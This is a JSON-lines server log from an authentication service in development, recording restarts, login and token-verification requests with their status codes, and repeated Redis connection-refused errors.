{"timestamp":"2025-05-03T04:08:35.949Z","level":"info","context":null,"message":"Logging initialized successfully."}
{"timestamp":"2025-05-03T04:08:35.954Z","level":"info","context":null,"message":"Environment variables initialized."}
{"timestamp":"2025-05-03T04:08:35.956Z","level":"info","context":null,"message":"Server is starting..."}
{"timestamp":"2025-05-03T04:08:35.964Z","level":"info","context":null,"message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-03T04:15:59.702Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-03T04:15:59.709Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-03T04:15:59.713Z","level":"info","context":"Server Initialization","message":"Server is starting..."}
{"timestamp":"2025-05-03T04:15:59.721Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-03T04:18:58.122Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-03T04:18:58.131Z","level":"info","context":"Server Initialization","message":"Server is starting..."}
{"timestamp":"2025-05-03T04:18:58.134Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-03T04:18:58.161Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-03T04:19:59.522Z","level":"info","context":"General","message":"Incoming request: GET /auth/users"}
{"timestamp":"2025-05-03T04:19:59.819Z","level":"info","context":"General","message":"Response status: 200 for GET /auth/users"}
{"timestamp":"2025-05-03T04:20:46.362Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-03T04:20:46.367Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-03T04:20:46.368Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-03T04:20:46.378Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-03T04:20:50.876Z","level":"info","context":"AuthRoutes","message":"Incoming request: GET /auth/users"}
{"timestamp":"2025-05-03T04:20:51.161Z","level":"info","context":"General","message":"Response status: 200 for GET /auth/users"}
{"timestamp":"2025-05-03T04:39:03.877Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-03T04:39:03.884Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-03T04:39:03.885Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-03T04:39:03.895Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-03T04:39:28.661Z","level":"info","context":"AuthRoutes","message":"Incoming request: POST /auth/login"}
{"timestamp":"2025-05-03T04:39:28.698Z","level":"info","context":"Login Endpoint","message":"Login request received."}
{"timestamp":"2025-05-03T04:39:29.286Z","level":"info","context":"General","message":"Response status: 200 for POST /auth/login"}
{"timestamp":"2025-05-03T04:39:53.212Z","level":"info","context":"AuthRoutes","message":"Incoming request: POST /auth/token/verify"}
{"timestamp":"2025-05-03T04:39:53.216Z","level":"info","context":"General","message":"Response status: 401 for POST /auth/token/verify"}
{"timestamp":"2025-05-03T04:51:58.991Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-03T04:51:59.003Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-03T04:51:59.005Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-03T04:51:59.017Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-03T04:52:21.727Z","level":"info","context":"AuthRoutes","message":"Request: GET /api/kv/KEYS"}
{"timestamp":"2025-05-03T04:52:21.739Z","level":"info","context":"General","message":"Response: 404 for GET /api/kv/KEYS"}
{"timestamp":"2025-05-03T04:52:39.849Z","level":"info","context":"AuthRoutes","message":"Request: GET /auth/redis/test"}
{"timestamp":"2025-05-03T04:52:39.893Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:39.895Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:39.902Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:39.903Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:39.968Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:39.969Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:40.084Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:40.086Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:40.288Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:40.291Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:40.507Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:40.507Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:40.768Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:40.769Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:41.076Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:41.078Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:41.445Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:41.445Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:41.871Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:41.875Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:42.339Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:42.342Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:42.849Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:42.850Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:43.368Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:43.368Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:43.877Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:43.879Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:44.394Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:44.395Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:44.912Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:44.912Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:45.424Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:45.425Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:45.933Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:45.934Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:46.445Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:46.445Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:46.950Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:46.952Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:47.457Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:47.458Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:47.975Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:47.977Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:48.486Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:48.487Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:49.002Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:49.003Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:49.521Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:49.521Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:50.027Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:50.028Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:50.543Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:50.543Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:51.050Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:51.056Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:51.570Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:51.571Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:52.082Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:52.085Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:52.605Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:52.606Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:53.121Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:53.123Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:53.628Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:53.628Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:54.136Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:54.137Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:54.645Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:54.646Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:55.181Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:55.221Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:55.768Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:55.769Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:56.286Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:56.287Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:56.800Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:56.801Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:57.320Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:57.321Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:57.833Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:57.834Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:58.351Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:58.352Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:58.871Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:58.872Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:59.393Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:59.393Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:52:59.906Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:52:59.907Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:53:00.416Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:53:00.417Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:53:00.921Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:53:00.922Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:53:01.447Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:53:01.449Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:53:01.958Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:53:01.959Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:53:02.477Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:53:02.477Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:53:02.991Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:53:02.991Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:53:03.494Z","level":"error","context":"General","message":"Redis Client Error:"}
{"timestamp":"2025-05-03T04:53:03.495Z","level":"error","context":"General","message":"Redis connection refused:"}
{"timestamp":"2025-05-03T04:53:03.867Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
{"timestamp":"2025-05-03T05:14:03.347Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-03T05:14:03.353Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-03T05:14:03.376Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-03T05:14:14.330Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
{"timestamp":"2025-05-03T05:14:19.457Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-03T05:14:19.461Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-03T05:14:19.463Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-03T05:14:19.475Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-03T05:15:04.533Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/login"}
{"timestamp":"2025-05-03T05:15:04.537Z","level":"info","context":"Login Endpoint","message":"Login request received."}
{"timestamp":"2025-05-03T05:15:04.539Z","level":"warn","context":"Login Validation","message":"Login failed: Missing username or password."}
{"timestamp":"2025-05-03T05:15:04.547Z","level":"info","context":"General","message":"Response: 400 for POST /auth/login"}
{"timestamp":"2025-05-03T13:12:45.346Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-03T13:12:45.433Z","level":"info","context":"General","message":"Response: 401 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-03T13:15:41.666Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
{"timestamp":"2025-05-03T13:15:46.767Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-03T13:15:46.777Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-03T13:15:46.780Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-03T13:15:46.802Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-03T13:16:20.702Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/login"}
{"timestamp":"2025-05-03T13:16:20.705Z","level":"info","context":"Login Endpoint","message":"Login request received."}
{"timestamp":"2025-05-03T13:16:20.706Z","level":"warn","context":"Login Validation","message":"Login failed: Missing username or password."}
{"timestamp":"2025-05-03T13:16:20.715Z","level":"info","context":"General","message":"Response: 400 for POST /auth/login"}
{"timestamp":"2025-05-03T13:16:27.684Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/login"}
{"timestamp":"2025-05-03T13:16:27.702Z","level":"info","context":"Login Endpoint","message":"Login request received."}
{"timestamp":"2025-05-03T13:16:28.121Z","level":"info","context":"General","message":"Response: 200 for POST /auth/login"}
{"timestamp":"2025-05-03T17:13:21.799Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
{"timestamp":"2025-05-05T06:48:02.230Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-05T06:48:02.236Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-05T06:48:02.237Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-05T06:48:02.252Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-05T07:03:07.504Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/login"}
{"timestamp":"2025-05-05T07:03:07.549Z","level":"info","context":"Login Endpoint","message":"Login request received."}
{"timestamp":"2025-05-05T07:03:08.035Z","level":"info","context":"General","message":"Response: 200 for POST /auth/login"}
{"timestamp":"2025-05-05T07:04:08.064Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
{"timestamp":"2025-05-05T07:04:15.760Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-05T07:04:15.765Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-05T07:04:15.766Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-05T07:04:15.779Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-05T07:04:21.160Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/login"}
{"timestamp":"2025-05-05T07:04:21.179Z","level":"info","context":"Login Endpoint","message":"Login request received."}
{"timestamp":"2025-05-05T07:04:21.578Z","level":"info","context":"General","message":"Response: 200 for POST /auth/login"}
{"timestamp":"2025-05-05T07:13:57.483Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
{"timestamp":"2025-05-05T07:14:03.510Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-05T07:14:03.515Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-05T07:14:03.516Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-05T07:14:03.531Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-05T07:14:08.967Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/login"}
{"timestamp":"2025-05-05T07:14:08.982Z","level":"info","context":"Login Endpoint","message":"Login request received."}
{"timestamp":"2025-05-05T07:14:08.983Z","level":"info","context":"General","message":"___Getting a connection from the pool..."}
{"timestamp":"2025-05-05T07:14:09.082Z","level":"info","context":"General","message":"___Connection acquired from pool!"}
{"timestamp":"2025-05-05T07:14:09.093Z","level":"info","context":"General","message":"___Getting a connection from the pool..."}
{"timestamp":"2025-05-05T07:14:09.095Z","level":"info","context":"General","message":"___Connection acquired from pool!"}
{"timestamp":"2025-05-05T07:14:09.289Z","level":"info","context":"General","message":"Response: 200 for POST /auth/login"}
{"timestamp":"2025-05-06T02:42:58.746Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
{"timestamp":"2025-05-06T02:43:03.078Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-06T02:43:03.083Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-06T02:43:03.084Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-06T02:43:03.095Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-06T02:43:05.556Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/login"}
{"timestamp":"2025-05-06T02:43:05.576Z","level":"info","context":"Login Endpoint","message":"Login request received."}
{"timestamp":"2025-05-06T02:43:05.577Z","level":"info","context":"General","message":"___Getting a connection from the pool..."}
{"timestamp":"2025-05-06T02:43:05.678Z","level":"info","context":"General","message":"___Connection acquired from pool!"}
{"timestamp":"2025-05-06T02:43:05.703Z","level":"info","context":"General","message":"___Getting a connection from the pool..."}
{"timestamp":"2025-05-06T02:43:05.704Z","level":"info","context":"General","message":"___Connection acquired from pool!"}
{"timestamp":"2025-05-06T02:43:05.706Z","level":"error","context":"General","message":"Closing database connection..."}
{"timestamp":"2025-05-06T02:43:05.852Z","level":"info","context":"General","message":"Auth token issued:"}
{"timestamp":"2025-05-06T02:43:05.855Z","level":"info","context":"General","message":"Refresh token issued:"}
{"timestamp":"2025-05-06T02:43:05.864Z","level":"info","context":"General","message":"Response: 200 for POST /auth/login"}
{"timestamp":"2025-05-06T02:50:55.409Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/login"}
{"timestamp":"2025-05-06T02:50:55.412Z","level":"info","context":"Login Endpoint","message":"Login request received."}
{"timestamp":"2025-05-06T02:50:55.413Z","level":"info","context":"General","message":"___Getting a connection from the pool..."}
{"timestamp":"2025-05-06T02:50:55.494Z","level":"info","context":"General","message":"___Connection acquired from pool!"}
{"timestamp":"2025-05-06T02:50:55.501Z","level":"info","context":"General","message":"___Getting a connection from the pool..."}
{"timestamp":"2025-05-06T02:50:55.502Z","level":"info","context":"General","message":"___Connection acquired from pool!"}
{"timestamp":"2025-05-06T02:50:55.507Z","level":"error","context":"General","message":"Closing database connection..."}
{"timestamp":"2025-05-06T02:50:55.634Z","level":"info","context":"General","message":"Auth token issued:"}
{"timestamp":"2025-05-06T02:50:55.636Z","level":"info","context":"General","message":"Refresh token issued:"}
{"timestamp":"2025-05-06T02:50:55.638Z","level":"info","context":"General","message":"Response: 200 for POST /auth/login"}
{"timestamp":"2025-05-06T02:51:31.795Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T02:51:31.798Z","level":"info","context":"General","message":"Response: 401 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T02:51:44.142Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify"}
{"timestamp":"2025-05-06T02:51:44.144Z","level":"info","context":"General","message":"Response: 401 for POST /auth/token/verify"}
{"timestamp":"2025-05-06T02:51:48.380Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T02:51:48.383Z","level":"info","context":"General","message":"Response: 401 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T02:52:58.717Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T02:52:58.720Z","level":"info","context":"General","message":"Response: 401 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T02:57:08.206Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
{"timestamp":"2025-05-06T02:57:11.705Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-06T02:57:11.710Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-06T02:57:11.711Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-06T02:57:11.722Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-06T02:57:14.046Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T02:57:14.061Z","level":"info","context":"General","message":"Response: 401 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:07:45.416Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
{"timestamp":"2025-05-06T03:07:49.333Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-06T03:07:49.338Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-06T03:07:49.339Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-06T03:07:49.352Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-06T03:07:50.375Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:07:50.398Z","level":"info","context":"General","message":"Response: 401 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:13:04.232Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
{"timestamp":"2025-05-06T03:13:08.236Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-06T03:13:08.241Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-06T03:13:08.242Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-06T03:13:08.254Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-06T03:13:10.753Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:13:10.775Z","level":"info","context":"General","message":"Response: 401 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:15:33.457Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:15:33.462Z","level":"info","context":"General","message":"Response: 401 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:16:00.632Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
{"timestamp":"2025-05-06T03:16:05.418Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-06T03:16:05.424Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-06T03:16:05.426Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-06T03:16:05.446Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-06T03:16:08.043Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:16:08.068Z","level":"info","context":"General","message":"Response: 401 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:17:07.233Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
{"timestamp":"2025-05-06T03:17:11.399Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-06T03:17:11.406Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-06T03:17:11.407Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-06T03:17:11.423Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-06T03:17:14.917Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:17:14.937Z","level":"info","context":"General","message":"Response: 401 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:18:52.984Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
{"timestamp":"2025-05-06T03:18:57.021Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-06T03:18:57.026Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-06T03:18:57.028Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-06T03:18:57.041Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-06T03:19:00.168Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:19:00.176Z","level":"info","context":"General","message":"Response: 400 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:19:07.007Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:19:07.025Z","level":"info","context":"General","message":"Response: 401 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:20:00.785Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
{"timestamp":"2025-05-06T03:20:05.732Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-06T03:20:05.737Z","level":"info","context":"Server","message":"Server is starting..."}
{"timestamp":"2025-05-06T03:20:05.738Z","level":"info","context":"General","message":"Environment variables initialized."}
{"timestamp":"2025-05-06T03:20:05.748Z","level":"info","context":"General","message":"Auth is up, go for it! 3000"}
{"timestamp":"2025-05-06T03:20:07.020Z","level":"info","context":"AuthRoutes","message":"Request: POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:20:07.041Z","level":"info","context":"General","message":"Response: 401 for POST /auth/token/verify?isRefreshToken=false"}
{"timestamp":"2025-05-06T03:20:22.401Z","level":"info","context":"General","message":"SIGINT received. Closing Redis connection..."}
{"timestamp":"2025-05-06T03:20:26.192Z","level":"info","context":"General","message":"Logging initialized successfully."}
{"timestamp":"2025-05-06T03:20:26.202Z","level":"info","context":"Server","message":"Server is starting..."}
